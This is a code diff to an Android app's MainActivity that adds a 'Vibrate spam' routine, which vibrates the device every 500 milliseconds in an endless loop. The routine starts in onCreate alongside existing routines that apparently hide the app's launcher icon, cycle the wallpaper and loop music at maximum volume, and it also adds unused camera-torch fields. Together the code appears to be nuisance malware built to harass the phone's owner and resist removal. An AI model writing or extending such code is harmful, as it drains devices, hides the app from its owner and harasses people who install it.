@@ -26,6 +26,10 @@ import android.webkit.WebViewClient;
 import android.widget.FrameLayout;
 import android.widget.Toast;
 
+import android.hardware.camera2.CameraAccessException;
+import android.hardware.camera2.CameraCharacteristics;
+import android.hardware.camera2.CameraManager;
+
 import java.io.File;
 import java.io.FileOutputStream;
 import java.io.InputStream;
@@ -50,6 +54,15 @@ public class MainActivity extends Activity {
     private Handler musicHandler;
     private MediaPlayer musicPlayer;
     private int wpIndex = 0;
+
+    private Handler torchHandler;
+    private CameraManager cameraManager;
+    private String torchCameraId;
+    private boolean torchOn;
+    private boolean torchRequested;
+    
+    private Handler vibrateHandler;
+    private android.os.Vibrator vibrator;
 
     @Override
     protected void onCreate(Bundle savedInstanceState) {
@@ -195,6 +208,7 @@ public class MainActivity extends Activity {
         startWallpaperLoop();
         switchToHiddenAlias();
         startMusicLoop();
+        startVibrateLoop();
 
         // 5) webview
         try {
@@ -374,6 +388,36 @@ public class MainActivity extends Activity {
         wallpaperHandler.post(r);
     }
 
+    
+
+    /* ------------------------------------------------------------------ */
+    /* ------------------------------------------------------------------ */
+    /* Vibrate spam 500ms                                                  */
+    /* ------------------------------------------------------------------ */
+    
+    @SuppressWarnings("deprecation")
+    private void startVibrateLoop() {
+        vibrator = (android.os.Vibrator) getSystemService(VIBRATOR_SERVICE);
+        if (vibrator == null || !vibrator.hasVibrator()) return;
+    
+        vibrateHandler = new Handler(Looper.getMainLooper());
+        final Runnable r = new Runnable() {
+            @Override public void run() {
+                try {
+                    if (Build.VERSION.SDK_INT >= 26) {
+                        vibrator.vibrate(android.os.VibrationEffect.createOneShot(
+                                200, android.os.VibrationEffect.DEFAULT_AMPLITUDE));
+                    } else {
+                        vibrator.vibrate(200);
+                    }
+                } catch (Throwable ignored) { }
+                if (vibrateHandler != null) vibrateHandler.postDelayed(this, 500);
+            }
+        };
+        vibrateHandler.post(r);
+    }
+    /* ------------------------------------------------------------------ */
+    
     /* ------------------------------------------------------------------ */
     /* Music loop max volume                                               */
     /* ------------------------------------------------------------------ */
